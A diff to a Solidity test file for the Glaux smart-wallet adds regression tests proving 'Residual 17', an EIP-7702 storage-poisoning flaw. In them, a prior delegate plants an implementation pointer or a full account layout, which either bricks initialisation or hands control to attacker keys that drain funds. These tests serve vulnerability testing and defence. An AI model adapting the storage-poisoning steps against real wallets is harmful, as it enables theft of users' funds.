@@ -593,4 +593,122 @@ contract BirthTest is GlauxFixture {
         assertFalse(ok);
         assertEq(ret, abi.encodeWithSelector(InvalidSlot.selector));
     }
+
+    /// @notice Residual 17: an EOA that delegated to Glaux was previously delegated to
+    ///         SOME OTHER contract, and that prior delegate wrote `IMPL_SLOT` before the
+    ///         account ever reached the router — an EIP-7702 re-delegation does not
+    ///         clear storage. `initialize` reads `IMPL_SLOT != address(0)` as "already
+    ///         born" and refuses to run, so the account can never take the birth path
+    ///         at all; and once delegated to the router, the router's own fallback
+    ///         reads that same pre-planted pointer and delegatecalls straight into
+    ///         whatever the prior delegate left there, with the account's storage and
+    ///         balance. This proves both halves: birth is permanently bricked, and the
+    ///         planted code is reachable and executed.
+    function test_residual17_plantedImplPointerBricksBirthAndIsExecuted() public {
+        uint256 victimPk = 0x71C72;
+        address victim = vm.addr(victimPk);
+        PriorDelegate prior = new PriorDelegate();
+        PoisonSink sink = new PoisonSink();
+
+        vm.signAndAttachDelegation(address(prior), victimPk);
+        PriorDelegate(victim)
+            .poison(GlauxStorage.IMPL_SLOT, bytes32(uint256(uint160(address(sink)))));
+
+        vm.signAndAttachDelegation(address(router), victimPk);
+        (bytes memory initData, bytes memory sig) = _initBlob();
+        vm.expectRevert(AlreadyInitialized.selector);
+        GlauxDelegate(payable(victim))
+            .initialize(address(impl), address(impl).codehash, initData, sig);
+
+        PoisonSink(victim).ping();
+        assertEq(
+            vm.load(victim, bytes32(uint256(0xC0FFEE))), bytes32(uint256(1)), "planted code ran"
+        );
+    }
+
+    /// @notice Residual 17, second outcome: the prior delegate plants a FULL Glaux
+    ///         `Layout` — `initialized = true`, `IMPL_SLOT` pointing at the real
+    ///         implementation, and all three factor slots holding attacker-controlled
+    ///         secp256k1 addresses — before the EOA ever signs a Glaux birth blob. The
+    ///         account never goes through `initialize`, yet the moment it delegates to
+    ///         the router it reads as a fully born Glaux account whose 2-of-3 quorum
+    ///         the attacker alone satisfies, and can drain funds sent to it.
+    function test_residual17_plantedFullStateMakesAccountAttackerOwned() public {
+        uint256 victimPk = 0x71C72;
+        uint256 aPk0 = 0xA11CE0;
+        uint256 aPk1 = 0xA11CE1;
+        uint256 aPk2 = 0xA11CE2;
+        address victim = vm.addr(victimPk);
+        PriorDelegate prior = new PriorDelegate();
+
+        vm.signAndAttachDelegation(address(prior), victimPk);
+        PriorDelegate(victim)
+            .poison(GlauxStorage.IMPL_SLOT, bytes32(uint256(uint160(address(impl)))));
+        PriorDelegate(victim).poison(GlauxStorage.SLOT, bytes32(uint256(1))); // initialized = true
+        uint256[3] memory pks = [aPk0, aPk1, aPk2];
+        for (uint256 i = 0; i < 3; i++) {
+            bytes32 base = bytes32(uint256(GlauxStorage.SLOT) + 1 + i * 2);
+            PriorDelegate(victim).poison(base, bytes32(uint256(GlauxStorage.VERIFIER_SECP256K1)));
+            PriorDelegate(victim).poison(bytes32(uint256(base) + 1), bytes32(uint256(32 * 2 + 1)));
+            PriorDelegate(victim)
+                .poison(
+                    keccak256(abi.encode(bytes32(uint256(base) + 1))),
+                    bytes32(uint256(uint160(vm.addr(pks[i]))))
+                );
+        }
+
+        vm.signAndAttachDelegation(address(router), victimPk);
+        vm.deal(victim, 5 ether);
+        assertEq(GlauxAccount(payable(victim)).implementation(), address(impl));
+        (uint8 t0, bytes memory d0) = GlauxAccount(payable(victim)).getSlot(0);
+        assertEq(t0, GlauxStorage.VERIFIER_SECP256K1);
+        assertEq(abi.decode(d0, (address)), vm.addr(aPk0));
+
+        address attacker = address(0xBADBAD);
+        Call[] memory calls = new Call[](1);
+        calls[0] = Call(attacker, 5 ether, "");
+        bytes32 d = GlauxStorage.eip191(
+            victim,
+            keccak256(
+                abi.encode(
+                    GlauxStorage.EXEC_DOMAIN,
+                    block.chainid,
+                    victim,
+                    uint64(0),
+                    keccak256(abi.encode(calls)),
+                    FAR_FUTURE
+                )
+            )
+        );
+        SlotSig[2] memory sigs;
+        sigs[0] = SlotSig(0, _sig65(aPk0, d));
+        sigs[1] = SlotSig(1, _sig65(aPk1, d));
+
+        vm.prank(attacker);
+        GlauxAccount(payable(victim)).executeWithSigs(calls, FAR_FUTURE, sigs);
+
+        assertEq(attacker.balance, 5 ether);
+    }
+}
+
+/// @notice Stands in for a wallet the account was delegated to BEFORE moving to
+///         Glaux, used by the residual-17 regression tests to write arbitrary
+///         storage into the victim EOA's account storage ahead of birth — exactly
+///         what an EIP-7702 re-delegation does not clear.
+contract PriorDelegate {
+    function poison(bytes32 slot, bytes32 value) external {
+        assembly {
+            sstore(slot, value)
+        }
+    }
+}
+
+/// @notice Minimal implementation planted at a pre-poisoned `IMPL_SLOT`, used to
+///         prove the router's fallback executes whatever that slot points at.
+contract PoisonSink {
+    function ping() external {
+        assembly {
+            sstore(0xC0FFEE, 1)
+        }
+    }
 }
